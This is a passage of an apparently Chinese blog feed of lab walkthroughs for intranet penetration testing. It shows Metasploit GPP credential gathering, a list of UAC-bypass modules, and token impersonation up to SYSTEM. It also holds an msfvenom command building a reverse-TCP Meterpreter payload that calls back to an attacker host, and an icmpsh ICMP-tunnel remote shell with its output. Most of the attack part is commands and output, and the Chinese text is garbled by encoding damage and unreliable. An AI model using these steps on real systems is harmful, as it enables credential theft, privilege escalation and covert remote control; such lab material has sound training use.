class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/credentials/gpp </span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/gpp):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   ALL      true             no        Enumerate all domains on network.</span><br><span class="line">   DOMAINS                   no        Enumerate list of space separated domains DOMAINS=&quot;dom1 dom2&quot;.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   STORE    true             no        Store the enumerated files in loot.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Checking for group policy history objects...</span><br><span class="line">[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Checking for SYSVOL locally...</span><br><span class="line">[-] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Enumerating Domains on the Network...</span><br><span class="line">[*] Retrieved Domain(s) JIYE, WORKGROUP from network</span><br><span class="line">[*] Enumerating domain information from the local registry...</span><br><span class="line">[*] Retrieved Domain(s) JIYE from registry</span><br><span class="line">[*] Retrieved DC DC.JIYE.NET from registry</span><br><span class="line">[*] Enumerating DCs for JIYE on the network...</span><br><span class="line">[-] No Domain Controllers found for JIYE</span><br><span class="line">[*] Searching for Policy Share on DC.JIYE.NET...</span><br><span class="line">[-] Error accessing \\DC.JIYE.NET\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.</span><br><span class="line">[*] Searching for Group Policy XML Files...</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x04-UACç»•è¿‡ææƒ-msf"><a href="#0x04-UACç»•è¿‡ææƒ-msf" class="headerlink" title="0x04.UACç»•è¿‡ææƒ(msf)"></a>0x04.UACç»•è¿‡ææƒ(msf)</h2><blockquote><p>ä½¿ç”¨å‰æï¼š</p><p>ä¸€æ˜¯ç³»ç»Ÿå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­<br>äºŒæ˜¯ç”¨æˆ·è´¦æˆ·æ§åˆ¶ç¨‹åºUACè®¾ç½®ä¸ºé»˜è®¤ï¼Œå³ â€œä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºæ—¶é€šçŸ¥æˆ‘â€</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br><span class="line">2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">3   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">4   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">5   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">6   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">7   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">8   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)</span><br><span class="line">9   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">10  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)</span><br><span class="line">11  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">12  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-ä»¤ç‰Œç›—å–"><a href="#0x05-ä»¤ç‰Œç›—å–" class="headerlink" title="0x05.ä»¤ç‰Œç›—å–"></a>0x05.ä»¤ç‰Œç›—å–</h2><h3 id="1-msfç›—å–"><a href="#1-msfç›—å–" class="headerlink" title="1.msfç›—å–"></a>1.msfç›—å–</h3><blockquote><p>å½“è·å¾—meterpreteræ—¶å¯ä»¥ä½¿ç”¨</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: JIYE\Administrator</span><br><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">JIYE\Administrator</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-æ¼æ´å‘ç°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´å‘ç°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´å‘ç°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´å‘ç°&lt;/h2&gt;&lt;h3 id=&quot;1-WMICå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;a href=&quot;#1-WMICå‘ç°å®‰è£…è¡¥ä¸&quot; class=&quot;headerlink&quot; title=&quot;1.WMICå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;/a&gt;1.WMICå‘ç°å®‰è£…è¡¥ä¸&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-msfå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;a href=&quot;#2-msfå‘ç°å®‰è£…è¡¥ä¸&quot; class=&quot;headerlink&quot; title=&quot;2.msfå‘ç°å®‰è£…è¡¥ä¸&quot;&gt;&lt;/a&gt;2.msfå‘ç°å®‰è£…è¡¥ä¸&lt;/h3&gt;&lt;p&gt;&lt;code&gt;é¦–å…ˆä½¿ç”¨msfvenomç”Ÿæˆæ¶æ„ç¨‹åº&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &amp;gt; shell.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="å†…ç½‘æ¸—é€æµ‹è¯•" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="å†…ç½‘å®‰å…¨" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€æµ‹è¯•-éšè—é€šä¿¡éš§é“æŠ€æœ¯</title>
    <link href="https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    <id>https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</id>
    <published>2021-07-24T09:30:16.000Z</published>
    <updated>2021-07-24T09:55:56.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01.åŸºç¡€çŸ¥è¯†"></a>0x01.åŸºç¡€çŸ¥è¯†</h2><blockquote><p>å®Œæˆå†…ç½‘ä¿¡æ¯æœé›†åï¼Œéœ€è¦å…ˆåˆ¤æ–­æµé‡æ˜¯å¦å‡ºå¾—å»ã€è¿›å¾—æ¥ã€‚éšè—é€šä¿¡éš§é“æŠ€æœ¯å¸¸ç”¨äºåœ¨è®¿é—®å—é™çš„ç½‘ç»œç¯å¢ƒä¸­è¿½è¸ªæ•°æ®æµå‘å’Œåœ¨éå—ä¿¡ä»»çš„ç½‘ç»œä¸­å®ç°å®‰å…¨çš„æ•°æ®ä¼ è¾“ã€‚</p></blockquote><h3 id="1-æ¦‚è¿°"><a href="#1-æ¦‚è¿°" class="headerlink" title="1.æ¦‚è¿°"></a>1.æ¦‚è¿°</h3><p>â€‹        åœ¨æ¸—é€åœºæ™¯ä¸­ï¼Œå„ç§å®‰å…¨è®¾å¤‡ä¼šæ£€æŸ¥å¯¹å¤–è¿æ¥çš„æƒ…å†µï¼Œå¦‚æœå‘ç°å¼‚å¸¸ï¼Œå°±ä¼šå¯¹é€šä¿¡è¿›è¡Œé˜»æ–­ã€‚å› æ­¤å»ºç«‹ä¸“é—¨çš„éšè”½éš§é“å°±ååˆ†å¿…è¦ï¼Œè¿™èƒ½ç»•è¿‡ç«¯å£å±è”½ã€‚<br>å¸¸ç”¨çš„éš§é“å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ç»œå±‚éš§é“ï¼šIPv6ã€ICMPã€GRE</span><br><span class="line">ä¼ è¾“å±‚éš§é“ï¼šTCPã€UDPã€å¸¸è§„ç«¯å£è½¬å‘</span><br><span class="line">åº”ç”¨å±‚éš§é“ï¼šSSHã€HTTPã€HTTPSã€DNS</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§"><a href="#2-åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§" class="headerlink" title="2.åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§"></a>2.åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§</h3><p>â€‹        åˆ¤æ–­å†…ç½‘çš„è¿é€šæ€§æ˜¯æŒ‡åˆ¤æ–­æœºå™¨èƒ½å¦ä¸Šå¤–ç½‘ç­‰ã€‚è¦ç»¼åˆåˆ¤æ–­å„ç§åè®®ï¼ˆTCPã€HTTPã€DNSã€ICMPç­‰ï¼‰åŠç«¯å£é€šä¿¡çš„æƒ…å†µã€‚å¸¸è§çš„å…è®¸æµé‡æµå‡ºçš„ç«¯å£æœ‰80ã€8080ã€443ã€53ã€110ã€123ç­‰ï¼Œå¸¸ç”¨çš„å†…ç½‘çš„è¿é€šæ€§åˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š</p><p><code>ICMPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><code>TCPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 10.1.1.5 3306</span><br></pre></td></tr></table></figure><p><code>DNSåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baiduc.om 8.8.8.8</span><br><span class="line">dig @8.8.8.8 www.baidu.com</span><br></pre></td></tr></table></figure><p><code>HTTPåè®®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p>â€‹        è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯æµé‡ä¸èƒ½ç›´æ¥æµå‡ºï¼Œéœ€è¦åœ¨å†…ç½‘ä¸­è®¾ç½®ä»£ç†ï¼Œåˆ¤æ–­æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1ã€æŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸å…¶ä»–æœºå™¨çš„1080ï¼ˆä¸ç»å¯¹ï¼‰ç­‰ç«¯å£çš„è¿æ¥ï¼Œå¯å°è¯•è¿è¡Œping -n 1 -a ipå‘½ä»¤</span><br><span class="line">2ã€æŸ¥çœ‹å†…ç½‘ä¸­æ˜¯å¦æœ‰ä¸»æœºåç±»ä¼¼äº&quot;proxy&quot;çš„æœºå™¨ã€‚</span><br><span class="line">3ã€æŸ¥çœ‹IEæµè§ˆå™¨çš„ç›´æ¥ä»£ç†ã€‚</span><br><span class="line">4ã€æ ¹æ®pacï¼ˆä»£ç†è‡ªåŠ¨é…ç½®ï¼‰æ–‡ä»¶çš„è·¯å¾„ï¼ˆè¿œç¨‹ã€æœ¬åœ°ï¼‰ï¼Œå°†å…¶ä¸‹è½½å¹¶æŸ¥çœ‹ã€‚</span><br><span class="line">5ã€æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåˆ©ç”¨curlå·¥å…·ç¡®è®¤ï¼š</span><br><span class="line">    curl https://www.baidu.com            //ä¸é€š</span><br><span class="line">    curl -x proxy-ip:port www.baidu.com        //é€š</span><br></pre></td></tr></table></figure><h2 id="0x02-ç½‘ç»œå±‚éš§é“æŠ€æœ¯"><a href="#0x02-ç½‘ç»œå±‚éš§é“æŠ€æœ¯" class="headerlink" title="0x02.ç½‘ç»œå±‚éš§é“æŠ€æœ¯"></a>0x02.ç½‘ç»œå±‚éš§é“æŠ€æœ¯</h2><h3 id="1-IPv6éš§é“"><a href="#1-IPv6éš§é“" class="headerlink" title="1.IPv6éš§é“"></a>1.IPv6éš§é“</h3><blockquote><p>IPv6éš§é“æŠ€æœ¯æ˜¯æŒ‡é€šè¿‡IPv4éš§é“ä¼ è¾“IPv6æ•°æ®æŠ¥æ–‡çš„æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå°†IPv6æŠ¥æ–‡æ•´ä½“å°è£…åœ¨IPv4æ•°æ®æŠ¥æ–‡ä¸­ï¼Œä»¥ä¾¿åœ¨IPv4éš§é“ä¸­ä¼ è¾“ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å› ä¸ºç°é˜¶æ®µçš„éƒ¨åˆ†å®‰å…¨è®¾å¤‡æ— æ³•è¯†åˆ«IPv6çš„é€šä¿¡æŠ€æœ¯ï¼Œè€Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿæ”¯æŒIPv6ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æŸäº›è½¯ä»¶æ¥é…ç½®å…è®¸è¿›è¡ŒIPv6é€šä¿¡ä»¥æ­¤æ¥é¿å¼€é˜²ç«å¢™å’Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œè€Œå³ä½¿è®¾å¤‡æ”¯æŒIPv6ï¼Œä¹Ÿå¯èƒ½æ— æ³•æ­£ç¡®åˆ†æå°è£…äº†IPv6æŠ¥æ–‡çš„IPv4æ•°æ®åŒ…ã€‚</span><br><span class="line">æ”¯æŒIPv6éš§é“çš„å·¥å…·æœ‰socatã€6tunnelã€nt6tunnelç­‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="2-ICMPéš§é“"><a href="#2-ICMPéš§é“" class="headerlink" title="2.ICMPéš§é“"></a>2.ICMPéš§é“</h3><blockquote><p>åœ¨ä¸€èˆ¬çš„é€šä¿¡åè®®é‡Œï¼Œå¦‚æœä¸¤å°è®¾å¤‡è¦è¿›è¡Œé€šä¿¡ï¼Œé¦–å…ˆè‚¯å®šéœ€è¦å¼€æ”¾ç«¯å£ï¼Œè€Œåœ¨ICMPä¸‹å°±ä¸éœ€è¦ï¼Œåœ¨ä¸€äº›ç½‘ç»œç¯å¢ƒä¸­å¦‚æœä½¿ç”¨å„ç±»ä¸Šå±‚éš§é“ï¼ˆHTTPã€DNSã€å¸¸è§„æ­£åå‘ç«¯å£è½¬å‘ç­‰ï¼‰è¿›è¡Œçš„æ“ä½œéƒ½å¤±è´¥åï¼Œå¸¸å¸¸ä¼šé€šè¿‡pingå‘½ä»¤è®¿é—®è¿œç¨‹è®¡ç®—æœºï¼Œå°è¯•å»ºç«‹ICMPéš§é“ï¼Œå°†TCP/UDPæ•°æ®å°è£…åœ¨ICMPçš„pingæ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ã€‚</p></blockquote><p><code>å¸¸ç”¨çš„ICMPéš§é“å·¥å…·æœ‰icmpshã€PingTunnelã€icmptunnelã€powershell icmpç­‰ï¼š</code></p><h4 id="01-icmpsh"><a href="#01-icmpsh" class="headerlink" title="01.icmpsh"></a>01.icmpsh</h4><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœ¬æœºï¼špython2 icmpsh_m.py &lt;æœ¬æœºIP&gt; &lt;ç›®æ ‡IP&gt;</span><br><span class="line">é¶æœºï¼šicmpsh -t &lt;å¤–è¿ä¸»æœºIP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆéœ€è¦å®‰è£…impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½åœ°å€ï¼šhttps://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python2 -m pip install .</span><br></pre></td></tr></table></figure><p><code>å…ˆåœ¨kaliä¸Šè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br></pre></td></tr></table></figure><p><code>åœ¨é¶æœºä¸Šè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh -t 192.168.1.8 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/Downloads/icmpsh# python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 5.2.3790]</span><br><span class="line">(C) ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">admin-ad4c9d4d8\administrator</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : local</span><br><span class="line">   IP Address. . . . . . . . . . . . : 10.1.1.4</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.1.1.1</span><br><span class="line"></span><br><span class="line">Ethernet adapter ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IP Address. . . . . . . . . . . . : 192.168.1.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;</span><br></pre></td></tr></table></figure><p><code>æŠ“åŒ…åˆ†æ</code></p><blockquote><p>192.168.1.10å‘192.168.1.6å‘èµ·è¯·æ±‚whoami</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121825789.png" class><blockquote><p>192.168.1.6å‘192.168.1.10å“åº”</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121936653.png" class><h4 id="02-PingTunnel"><a href="#02-PingTunnel" class="headerlink" title="02.PingTunnel"></a>02.PingTunnel</h4><p><code>å®‰è£…ä¾èµ–</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> cd libpcap-1.10.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd PingTunnel/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">é‡åˆ°æŠ¥é”™å®‰è£…ä»¥ä¸‹</span><br><span class="line">apt-get install flex byacc -y #æˆ‘é‡åˆ°çš„æŠ¥é”™æ˜¯ç¼ºè¿™ä¿©</span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">kaliæ”»å‡»æœº</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ifconfig                                                                                                                                             71 â¨¯</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:befd:d9fb:f05a:6005  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:4f:25:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 12484  bytes 6520141 (6.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3141  bytes 662478 (646.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        TX errors 